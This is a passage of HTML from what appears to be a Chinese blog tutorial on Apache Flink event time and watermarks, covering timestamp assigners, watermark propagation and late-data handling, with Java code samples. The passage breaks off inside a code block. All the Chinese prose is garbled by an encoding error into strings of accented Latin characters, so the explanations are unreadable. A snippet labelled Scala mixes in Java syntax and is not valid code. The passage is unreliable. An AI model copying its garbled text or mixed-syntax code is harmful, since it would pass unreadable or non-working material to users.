src="https://img-blog.csdnimg.cn/20200526200231905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Lxnx1&originHeight=294&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ä¸åŒçš„æ—¶é—´è¯­ä¹‰æœ‰ä¸åŒçš„åº”ç”¨åœºåˆ</li><li><strong>æˆ‘ä»¬å¾€å¾€æ›´å…³å¿ƒäº‹ä»¶äº‹ä»¶ï¼ˆEvent Timeï¼‰</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/20200526200432798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=We29M&originHeight=336&originWidth=559&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>è¿™é‡Œå‡è®¾ç©æ¸¸æˆï¼Œä¸¤åˆ†é’Ÿå†…å¦‚æœè¿‡5å…³å°±æœ‰å¥–åŠ±ã€‚ç”¨æˆ·ååœ°é“ç©æ¸¸æˆï¼Œè¿›å…¥éš§é“å‰å·²ç»è¿‡3å…³ï¼Œåœ¨éš§é“ä¸­åˆè¿‡äº†2å…³ã€‚ä½†æ˜¯ä¿¡å·ä¸å¥½ï¼Œåä¸¤å…³é€šå…³çš„ä¿¡æ¯ï¼Œç­‰åˆ°å‡ºéš§é“çš„æ—¶å€™ï¼ˆ8:23:20ï¼‰æ‰æ­£å¼åˆ°è¾¾æœåŠ¡å™¨ã€‚å¦‚æœä¸ºäº†ç”¨æˆ·ä½“éªŒï¼Œé‚£ä¹ˆåº”è¯¥æŒ‰ç…§Event Timeå¤„ç†ä¿¡æ¯ï¼Œä¿è¯ç”¨æˆ·è·å¾—æ¸¸æˆå¥–åŠ±ã€‚</code></pre><ul><li> Event Timeå¯ä»¥ä»æ—¥å¿—æ•°æ®çš„æ—¶é—´æˆ³ï¼ˆtimestampï¼‰ä¸­æå–  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017-11-02 18:27:15.624 INFO Fail over to rm</span><br></pre></td></tr></table></figure></li></ul><h4 id="EventTimeçš„å¼•å…¥"><a href="#EventTimeçš„å¼•å…¥" class="headerlink" title="EventTimeçš„å¼•å…¥"></a>EventTimeçš„å¼•å…¥</h4><pre><code>**åœ¨Flinkçš„æµå¼å¤„ç†ä¸­ï¼Œç»å¤§éƒ¨åˆ†çš„ä¸šåŠ¡éƒ½ä¼šä½¿ç”¨eventTime**ï¼Œä¸€èˆ¬åªåœ¨eventTimeæ— æ³•ä½¿ç”¨æ—¶ï¼Œæ‰ä¼šè¢«è¿«ä½¿ç”¨ProcessingTimeæˆ–è€…IngestionTimeã€‚_ï¼ˆè™½ç„¶é»˜è®¤ç¯å¢ƒé‡Œä½¿ç”¨çš„å°±æ˜¯ProcessingTimeï¼Œä½¿ç”¨EventTimeéœ€è¦å¦å¤–è®¾ç½®ï¼‰_å¦‚æœè¦ä½¿ç”¨EventTimeï¼Œé‚£ä¹ˆéœ€è¦å¼•å…¥EventTimeçš„æ—¶é—´å±æ€§ï¼Œå¼•å…¥æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// ä»è°ƒç”¨æ—¶åˆ»å¼€å§‹ç»™envåˆ›å»ºçš„æ¯ä¸€ä¸ªstreamè¿½åŠ æ—¶é—´ç‰¹å¾</span></span><br><span class="line">env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šå…·ä½“çš„æ—¶é—´ï¼Œè¿˜éœ€è¦ä»æ•°æ®ä¸­æå–æ—¶é—´æˆ³ã€‚</strong></p><h4 id="Watermark"><a href="#Watermark" class="headerlink" title="Watermark"></a>Watermark</h4><blockquote><p><a href="https://blog.csdn.net/lmalds/article/details/52704170">Flinkæµè®¡ç®—ç¼–ç¨‹â€“watermarkï¼ˆæ°´ä½çº¿ï¼‰ç®€ä»‹</a>    &lt;=    ä¸é”™çš„æ–‡ç« ï¼Œå»ºè®®é˜…è¯»</p></blockquote><h5 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h5><ul><li><strong>Flinkå¯¹äºè¿Ÿåˆ°æ•°æ®æœ‰ä¸‰å±‚ä¿éšœ</strong>ï¼Œå…ˆæ¥ååˆ°çš„ä¿éšœé¡ºåºæ˜¯ï¼š <ul><li>WaterMark =&gt; çº¦ç­‰äºæ”¾å®½çª—å£æ ‡å‡†</li><li>allowedLateness =&gt; å…è®¸è¿Ÿåˆ°ï¼ˆProcessingTimeè¶…æ—¶ï¼Œä½†æ˜¯EventTimeæ²¡è¶…æ—¶ï¼‰</li><li>sideOutputLateData =&gt; è¶…è¿‡è¿Ÿåˆ°æ—¶é—´ï¼Œå¦å¤–æ•è·ï¼Œä¹‹åå¯ä»¥è‡ªå·±æ‰¹å¤„ç†åˆå¹¶å…ˆå‰çš„æ•°æ®</li></ul></li></ul><hr><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-æ—¶é—´è¯­ä¹‰ä¸WartmarkåŠEventTimeåœ¨Windowä¸­çš„ä½¿ç”¨</a></p></blockquote><pre><code>æˆ‘ä»¬çŸ¥é“ï¼Œæµå¤„ç†ä»äº‹ä»¶äº§ç”Ÿï¼Œåˆ°æµç»sourceï¼Œå†åˆ°operatorï¼Œä¸­é—´æ˜¯æœ‰ä¸€ä¸ªè¿‡ç¨‹å’Œæ—¶é—´çš„ï¼Œè™½ç„¶å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæµåˆ°operatorçš„æ•°æ®éƒ½æ˜¯æŒ‰ç…§äº‹ä»¶äº§ç”Ÿçš„æ—¶é—´é¡ºåºæ¥çš„ï¼Œä½†æ˜¯ä¹Ÿä¸æ’é™¤ç”±äºç½‘ç»œã€åˆ†å¸ƒå¼ç­‰åŸå› ï¼Œå¯¼è‡´ä¹±åºçš„äº§ç”Ÿï¼Œæ‰€è°“ä¹±åºï¼Œå°±æ˜¯æŒ‡Flinkæ¥æ”¶åˆ°çš„äº‹ä»¶çš„å…ˆåé¡ºåºä¸æ˜¯ä¸¥æ ¼æŒ‰ç…§äº‹ä»¶çš„Event Timeé¡ºåºæ’åˆ—çš„ã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20200526201305372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=xT718&originHeight=276&originWidth=435&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>é‚£ä¹ˆæ­¤æ—¶å‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œä¸€æ—¦å‡ºç°ä¹±åºï¼Œå¦‚æœåªæ ¹æ®eventTimeå†³å®šwindowçš„è¿è¡Œï¼Œæˆ‘ä»¬ä¸èƒ½æ˜ç¡®æ•°æ®æ˜¯å¦å…¨éƒ¨åˆ°ä½ï¼Œä½†åˆä¸èƒ½æ— é™æœŸçš„ç­‰ä¸‹å»ï¼Œæ­¤æ—¶å¿…é¡»è¦æœ‰ä¸ªæœºåˆ¶æ¥ä¿è¯ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´åï¼Œå¿…é¡»è§¦å‘windowå»è¿›è¡Œè®¡ç®—äº†ï¼Œè¿™ä¸ªç‰¹åˆ«çš„æœºåˆ¶ï¼Œå°±æ˜¯Watermarkã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20200526201418333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=UwrK6&originHeight=463&originWidth=1247&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> å½“Flinkä»¥<strong>Event Timeæ¨¡å¼</strong>å¤„ç†æ•°æ®æµæ—¶ï¼Œå®ƒä¼šæ ¹æ®<strong>æ•°æ®é‡Œçš„æ—¶é—´æˆ³</strong>æ¥å¤„ç†åŸºäºæ—¶é—´çš„ç®—å­ã€‚<br>ï¼ˆæ¯”å¦‚5sä¸€ä¸ªçª—å£ï¼Œé‚£ä¹ˆç†æƒ³æƒ…å†µä¸‹ï¼Œé‡åˆ°æ—¶é—´æˆ³æ˜¯5sçš„æ•°æ®æ—¶ï¼Œå°±è®¤ä¸º[0,5s)æ—¶é—´æ®µçš„æ¡¶bucketå°±å¯ä»¥å…³é—­äº†ã€‚ï¼‰ </li><li> å®é™…ç”±äºç½‘ç»œã€åˆ†å¸ƒå¼ä¼ è¾“å¤„ç†ç­‰åŸå› ï¼Œä¼šå¯¼è‡´ä¹±åºæ•°æ®çš„äº§ç”Ÿ </li><li> ä¹±åºæ•°æ®ä¼šå¯¼è‡´çª—å£è®¡ç®—ä¸å‡†ç¡®<br>ï¼ˆå¦‚æœæŒ‰ç…§å‰é¢è¯´æ³•ï¼Œè·å–åˆ°5sæ—¶é—´æˆ³çš„æ•°æ®ï¼Œä½†æ˜¯2sï¼Œ3sä¹±åºæ•°æ®è¿˜æ²¡åˆ°ï¼Œç†è®ºä¸Šä¸åº”è¯¥å…³é—­æ¡¶ï¼‰ </li></ul><hr><ul><li>æ€æ ·é¿å…ä¹±åºæ•°æ®å¸¦æ¥çš„è®¡ç®—ä¸æ­£ç¡®ï¼Ÿ</li><li>é‡åˆ°ä¸€ä¸ªæ—¶é—´æˆ³è¾¾åˆ°äº†çª—å£å…³é—­æ—¶é—´ï¼Œä¸åº”è¯¥ç«‹å³è§¦å‘çª—å£è®¡ç®—ï¼Œè€Œæ˜¯ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç­‰è¿Ÿåˆ°çš„æ•°æ®æ¥äº†å†å…³é—­çª—å£</li></ul><ol><li> Watermarkæ˜¯ä¸€ç§è¡¡é‡Event Timeè¿›å±•çš„æœºåˆ¶ï¼Œå¯ä»¥è®¾å®šå»¶è¿Ÿè§¦å‘ </li><li> Watermarkæ˜¯ç”¨äºå¤„ç†ä¹±åºäº‹ä»¶çš„ï¼Œè€Œæ­£ç¡®çš„å¤„ç†ä¹±åºäº‹ä»¶ï¼Œé€šå¸¸ç”¨Watermarkæœºåˆ¶ç»“åˆwindowæ¥å®ç° </li><li> æ•°æ®æµä¸­çš„Watermarkç”¨äºè¡¨ç¤ºâ€timestampå°äºWatermarkçš„æ•°æ®ï¼Œéƒ½å·²ç»åˆ°è¾¾äº†â€œï¼Œå› æ­¤ï¼Œwindowçš„æ‰§è¡Œä¹Ÿæ˜¯ç”±Watermarkè§¦å‘çš„ã€‚ </li><li> Watermarkå¯ä»¥ç†è§£æˆä¸€ä¸ªå»¶è¿Ÿè§¦å‘æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®Watermarkçš„å»¶æ—¶æ—¶é•¿tï¼Œæ¯æ¬¡ç³»ç»Ÿä¼šæ ¡éªŒå·²ç»åˆ°è¾¾çš„æ•°æ®ä¸­æœ€å¤§çš„maxEventTimeï¼Œç„¶åè®¤å®ševentTimeå°äºmaxEventTime - tçš„æ‰€æœ‰æ•°æ®éƒ½å·²ç»åˆ°è¾¾ï¼Œ<strong>å¦‚æœæœ‰çª—å£çš„åœæ­¢æ—¶é—´ç­‰äºmaxEventTime â€“ tï¼Œé‚£ä¹ˆè¿™ä¸ªçª—å£è¢«è§¦å‘æ‰§è¡Œã€‚</strong><br><code>Watermark = maxEventTime-å»¶è¿Ÿæ—¶é—´t</code> </li><li> watermark ç”¨æ¥è®©ç¨‹åºè‡ªå·±å¹³è¡¡å»¶è¿Ÿå’Œç»“æœæ­£ç¡®æ€§ </li></ol><p><em>watermarkå¯ä»¥ç†è§£ä¸ºæŠŠåŸæœ¬çš„çª—å£æ ‡å‡†ç¨å¾®æ”¾å®½äº†ä¸€ç‚¹ã€‚ï¼ˆæ¯”å¦‚åŸæœ¬5sï¼Œè®¾ç½®å»¶è¿Ÿæ—¶é—´=2sï¼Œé‚£ä¹ˆå®é™…ç­‰åˆ°7sçš„æ•°æ®åˆ°è¾¾æ—¶ï¼Œæ‰è®¤ä¸ºæ˜¯[0,5ï¼‰çš„æ¡¶éœ€è¦å…³é—­äº†ï¼‰</em></p><p>æœ‰åºæµçš„Watermarkerå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆå»¶è¿Ÿæ—¶é—´è®¾ç½®ä¸º0sï¼‰</p><p><em>æ­¤æ—¶ä»¥5sä¸€ä¸ªçª—å£ï¼Œé‚£ä¹ˆEventTime=5sçš„å…ƒç´ åˆ°è¾¾æ—¶ï¼Œå…³é—­ç¬¬ä¸€ä¸ªçª—å£ï¼Œä¸‹å›¾å³W(5)ï¼ŒW(10)åŒç†ã€‚</em></p><p><img src="https://img-blog.csdnimg.cn/20200526201731274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=O7EfP&originHeight=227&originWidth=1409&originalType=binary&ratio=1&status=done&style=none"></p><p>ä¹±åºæµçš„Watermarkerå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆå»¶è¿Ÿæ—¶é—´è®¾ç½®ä¸º2sï¼‰</p><p><em>ä¹±åºæµï¼Œæ‰€ä»¥å¯èƒ½å‡ºç°EventTimeå‰åé¡ºåºä¸ä¸€è‡´çš„æƒ…å†µï¼Œè¿™é‡Œå»¶è¿Ÿæ—¶é—´è®¾ç½®2sï¼Œç¬¬ä¸€ä¸ªçª—å£åˆ™ä¸º</em><code>_5s+2s_</code><em>ï¼Œå½“EventTime=7sçš„æ•°æ®åˆ°è¾¾æ—¶ï¼Œå…³é—­ç¬¬ä¸€ä¸ªçª—å£ã€‚ç¬¬äºŒä¸ªçª—å£åˆ™æ˜¯</em><code>_5*2+2=12s_</code><em>ï¼Œå½“12sè¿™ä¸ªEventTimeçš„æ•°æ®åˆ°è¾¾æ—¶ï¼Œå…³é—­ç¬¬äºŒä¸ªçª—å£ã€‚</em></p><p><img src="https://img-blog.csdnimg.cn/2020052620175060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=BZp8k&originHeight=219&originWidth=1268&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>å½“Flinkæ¥æ”¶åˆ°æ•°æ®æ—¶ï¼Œä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™å»ç”ŸæˆWatermarkï¼Œè¿™æ¡Watermarkå°±ç­‰äºå½“å‰æ‰€æœ‰åˆ°è¾¾æ•°æ®ä¸­çš„maxEventTime-å»¶è¿Ÿæ—¶é•¿ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ**Watermarkæ˜¯åŸºäºæ•°æ®æºå¸¦çš„æ—¶é—´æˆ³ç”Ÿæˆçš„**ï¼Œä¸€æ—¦Watermarkæ¯”å½“å‰æœªè§¦å‘çš„çª—å£çš„åœæ­¢æ—¶é—´è¦æ™šï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ç›¸åº”çª—å£çš„æ‰§è¡Œã€‚**ç”±äºevent timeæ˜¯ç”±æ•°æ®æºå¸¦çš„ï¼Œå› æ­¤ï¼Œå¦‚æœè¿è¡Œè¿‡ç¨‹ä¸­æ— æ³•è·å–æ–°çš„æ•°æ®ï¼Œé‚£ä¹ˆæ²¡æœ‰è¢«è§¦å‘çš„çª—å£å°†æ°¸è¿œéƒ½ä¸è¢«è§¦å‘**ã€‚ä¸Šå›¾ä¸­ï¼Œæˆ‘ä»¬è®¾ç½®çš„å…è®¸æœ€å¤§å»¶è¿Ÿåˆ°è¾¾æ—¶é—´ä¸º2sï¼Œæ‰€ä»¥æ—¶é—´æˆ³ä¸º7sçš„äº‹ä»¶å¯¹åº”çš„Watermarkæ˜¯5sï¼Œæ—¶é—´æˆ³ä¸º12sçš„äº‹ä»¶çš„Watermarkæ˜¯10sï¼Œå¦‚æœæˆ‘ä»¬çš„çª—å£1æ˜¯`1s~5s`ï¼Œçª—å£2æ˜¯`6s~10s`ï¼Œé‚£ä¹ˆæ—¶é—´æˆ³ä¸º7sçš„äº‹ä»¶åˆ°è¾¾æ—¶çš„Watermarkeræ°å¥½è§¦å‘çª—å£1ï¼Œæ—¶é—´æˆ³ä¸º12sçš„äº‹ä»¶åˆ°è¾¾æ—¶çš„Watermarkæ°å¥½è§¦å‘çª—å£2ã€‚**Watermark å°±æ˜¯è§¦å‘å‰ä¸€çª—å£çš„â€œå…³çª—æ—¶é—´â€ï¼Œä¸€æ—¦è§¦å‘å…³é—¨é‚£ä¹ˆä»¥å½“å‰æ—¶åˆ»ä¸ºå‡†åœ¨çª—å£èŒƒå›´å†…çš„æ‰€æœ‰æ‰€æœ‰æ•°æ®éƒ½ä¼šæ”¶å…¥çª—ä¸­ã€‚****åªè¦æ²¡æœ‰è¾¾åˆ°æ°´ä½é‚£ä¹ˆä¸ç®¡ç°å®ä¸­çš„æ—¶é—´æ¨è¿›äº†å¤šä¹…éƒ½ä¸ä¼šè§¦å‘å…³çª—ã€‚**</code></pre><h5 id="Watermarkçš„ç‰¹ç‚¹"><a href="#Watermarkçš„ç‰¹ç‚¹" class="headerlink" title="Watermarkçš„ç‰¹ç‚¹"></a>Watermarkçš„ç‰¹ç‚¹</h5><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-æ—¶é—´è¯­ä¹‰ä¸WartmarkåŠEventTimeåœ¨Windowä¸­çš„ä½¿ç”¨</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200526204111817.png###id=QdWNb&originHeight=164&originWidth=674&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> watermark æ˜¯ä¸€æ¡ç‰¹æ®Šçš„æ•°æ®è®°å½• </li><li> <strong>watermark å¿…é¡»å•è°ƒé€’å¢</strong>ï¼Œä»¥ç¡®ä¿ä»»åŠ¡çš„äº‹ä»¶æ—¶é—´æ—¶é’Ÿåœ¨å‘å‰æ¨è¿›ï¼Œè€Œä¸æ˜¯åœ¨åé€€ </li><li> watermark ä¸æ•°æ®çš„æ—¶é—´æˆ³ç›¸å…³ </li></ul><h5 id="Watermarkçš„ä¼ é€’"><a href="#Watermarkçš„ä¼ é€’" class="headerlink" title="Watermarkçš„ä¼ é€’"></a>Watermarkçš„ä¼ é€’</h5><p><img src="https://img-blog.csdnimg.cn/20200526204125805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wXLnd&originHeight=387&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>å›¾ä¸€ï¼Œå½“å‰Taskæœ‰å››ä¸ªä¸Šæ¸¸Taskç»™è‡ªå·±ä¼ è¾“WaterMarkä¿¡æ¯ï¼Œé€šè¿‡æ¯”è¾ƒï¼Œåªå–å½“å‰æœ€å°å€¼ä½œä¸ºè‡ªå·±çš„æœ¬åœ°Event-time clockï¼Œä¸Šå›¾ä¸­ï¼Œå½“å‰Task[0,2)çš„æ¡¶å°±å¯å…³é—­äº†ï¼Œå› ä¸ºæ‰€æœ‰ä¸Šæ¸¸ä¸­2sæœ€å°ï¼Œèƒ½ä¿è¯2sçš„WaterMarkæ˜¯å‡†ç¡®çš„ï¼ˆæ‰€æœ‰ä¸Šæ¸¸Watermarkéƒ½å·²ç»&gt;=2s)ã€‚è¿™æ—¶å€™å°†Watermark=2å¹¿æ’­åˆ°å½“å‰Taskçš„ä¸‹æ¸¸ã€‚</li><li>å›¾äºŒï¼Œä¸Šæ¸¸çš„WatermarkæŒç»­å˜åŠ¨ï¼Œæ­¤æ—¶Watermark=3æˆä¸ºæ–°çš„æœ€å°å€¼ï¼Œæ›´æ–°æœ¬åœ°Taskçš„event-time clockï¼ŒåŒæ—¶å°†æœ€æ–°çš„Watermark=3å¹¿æ’­åˆ°ä¸‹æ¸¸</li><li>å›¾ä¸‰ï¼Œä¸Šæ¸¸çš„Watermarkè™½ç„¶æ›´æ–°äº†ï¼Œä½†æ˜¯å½“å‰æœ€å°å€¼è¿˜æ˜¯3ï¼Œæ‰€ä»¥ä¸æ›´æ–°event-time clockï¼Œä¹Ÿä¸éœ€è¦å¹¿æ’­åˆ°ä¸‹æ¸¸</li><li>å›¾å››ï¼Œå’Œå›¾äºŒåŒç†ï¼Œæ›´æ–°æœ¬åœ°event-time clockï¼ŒåŒæ—¶å‘ä¸‹æ¸¸å¹¿æ’­æœ€æ–°çš„Watermark=4</li></ol><h5 id="Watermarkçš„å¼•å…¥"><a href="#Watermarkçš„å¼•å…¥" class="headerlink" title="Watermarkçš„å¼•å…¥"></a>Watermarkçš„å¼•å…¥</h5><pre><code>watermarkçš„å¼•å…¥å¾ˆç®€å•ï¼Œå¯¹äºä¹±åºæ•°æ®ï¼Œæœ€å¸¸è§çš„å¼•ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</code></pre><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataStream.assignTimestampsAndWatermarks( <span class="keyword">new</span> <span class="type">BoundedOutOfOrdernessTimestampExtractor</span>&lt;<span class="type">SensorReading</span>&gt;(<span class="type">Time</span>.milliseconds(<span class="number">1000</span>)) &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  public long extractTimestamp(element: <span class="type">SensorReading</span>): <span class="type">Long</span> = &#123; </span><br><span class="line">    <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000</span>L;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><pre><code>**Event Timeçš„ä½¿ç”¨ä¸€å®šè¦æŒ‡å®šæ•°æ®æºä¸­çš„æ—¶é—´æˆ³ã€‚å¦åˆ™ç¨‹åºæ— æ³•çŸ¥é“äº‹ä»¶çš„äº‹ä»¶æ—¶é—´æ˜¯ä»€ä¹ˆ(æ•°æ®æºé‡Œçš„æ•°æ®æ²¡æœ‰æ—¶é—´æˆ³çš„è¯ï¼Œå°±åªèƒ½ä½¿ç”¨Processing Timeäº†)**ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢çš„ä¾‹å­ä¸­åˆ›å»ºäº†ä¸€ä¸ªçœ‹èµ·æ¥æœ‰ç‚¹å¤æ‚çš„ç±»ï¼Œè¿™ä¸ªç±»å®ç°çš„å…¶å®å°±æ˜¯åˆ†é…æ—¶é—´æˆ³çš„æ¥å£ã€‚Flinkæš´éœ²äº†TimestampAssigneræ¥å£ä¾›æˆ‘ä»¬å®ç°ï¼Œä½¿æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å¦‚ä½•ä»äº‹ä»¶æ•°æ®ä¸­æŠ½å–æ—¶é—´æˆ³ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// è®¾ç½®äº‹ä»¶æ—¶é—´è¯­ä¹‰ env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span></span><br><span class="line">DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> SensorSource()) .assignTimestampsAndWatermarks(<span class="keyword">new</span> MyAssigner());</span><br></pre></td></tr></table></figure><p>MyAssigneræœ‰ä¸¤ç§ç±»å‹</p><ul><li> AssignerWithPeriodicWatermarks </li><li> AssignerWithPunctuatedWatermarks </li></ul><p>ä»¥ä¸Šä¸¤ä¸ªæ¥å£éƒ½ç»§æ‰¿è‡ªTimestampAssignerã€‚</p><h6 id="TimestampAssigner"><a href="#TimestampAssigner" class="headerlink" title="TimestampAssigner"></a>TimestampAssigner</h6><p>####### AssignerWithPeriodicWatermarks</p><ul><li> å‘¨æœŸæ€§çš„ç”Ÿæˆ watermarkï¼šç³»ç»Ÿä¼šå‘¨æœŸæ€§çš„å°† watermark æ’å…¥åˆ°æµä¸­ </li><li> é»˜è®¤å‘¨æœŸæ˜¯200æ¯«ç§’ï¼Œå¯ä»¥ä½¿ç”¨ <code>ExecutionConfig.setAutoWatermarkInterval()</code> æ–¹æ³•è¿›è¡Œè®¾ç½® </li><li> <strong>å‡åºå’Œå‰é¢ä¹±åºçš„å¤„ç† BoundedOutOfOrderness ï¼Œéƒ½æ˜¯åŸºäºå‘¨æœŸæ€§ watermark çš„</strong>ã€‚ </li></ul><p>####### AssignerWithPunctuatedWatermarks</p><ul><li>æ²¡æœ‰æ—¶é—´å‘¨æœŸè§„å¾‹ï¼Œå¯æ‰“æ–­çš„ç”Ÿæˆ watermarkï¼ˆå³å¯å®ç°æ¯æ¬¡è·å–æ•°æ®éƒ½æ›´æ–°watermarkï¼‰</li></ul><h5 id="Watermarkçš„è®¾å®š"><a href="#Watermarkçš„è®¾å®š" class="headerlink" title="Watermarkçš„è®¾å®š"></a>Watermarkçš„è®¾å®š</h5><ul><li>åœ¨Flinkä¸­ï¼ŒWatermarkç”±åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç”Ÿæˆï¼Œè¿™é€šå¸¸éœ€è¦å¯¹ç›¸åº”çš„é¢†åŸŸæœ‰ä¸€å®šçš„äº†è§£</li><li>å¦‚æœWatermarkè®¾ç½®çš„å»¶è¿Ÿå¤ªä¹…ï¼Œæ”¶åˆ°ç»“æœçš„é€Ÿåº¦å¯èƒ½å°±ä¼šå¾ˆæ…¢ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨æ°´ä½çº¿åˆ°è¾¾ä¹‹å‰è¾“å‡ºä¸€ä¸ªè¿‘ä¼¼ç»“æœ</li><li>å¦‚æœWatermarkåˆ°è¾¾å¾—å¤ªæ—©ï¼Œåˆ™å¯èƒ½æ”¶åˆ°é”™è¯¯ç»“æœï¼Œä¸è¿‡Flinkå¤„ç†è¿Ÿåˆ°æ•°æ®çš„æœºåˆ¶å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜</li></ul><pre><code>_ä¸€èˆ¬å¤§æ•°æ®åœºæ™¯éƒ½æ˜¯è€ƒè™‘é«˜å¹¶å‘æƒ…å†µï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨å‘¨æœŸæ€§ç”ŸæˆWatermarkçš„æ–¹å¼ï¼Œé¿å…é¢‘ç¹åœ°ç”ŸæˆWatermarkã€‚_</code></pre><hr><p><strong>æ³¨ï¼šä¸€èˆ¬è®¤ä¸ºWatermarkçš„è®¾ç½®ä»£ç ï¼Œåœ¨é‡ŒSourceæ­¥éª¤è¶Šè¿‘çš„åœ°æ–¹è¶Šåˆé€‚ã€‚</strong></p><h5 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p>æµ‹è¯•Watermarkå’Œè¿Ÿåˆ°æ•°æ®</p><p>javaä»£ç ï¼ˆæ—§ç‰ˆFlinkï¼‰ï¼Œæ–°ç‰ˆçš„ä»£ç æˆ‘æš‚æ—¶ä¸æ‰“ç®—æŠ˜è…¾ï¼Œä¹‹åç”¨ä¸Šå†è¯´å§ã€‚</p><p><strong>è¿™é‡Œè®¾ç½®çš„Watermarkçš„å»¶æ—¶æ—¶é—´æ˜¯2sï¼Œå®é™…ä¸€èˆ¬è®¾ç½®å’Œwindowå¤§å°ä¸€è‡´ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 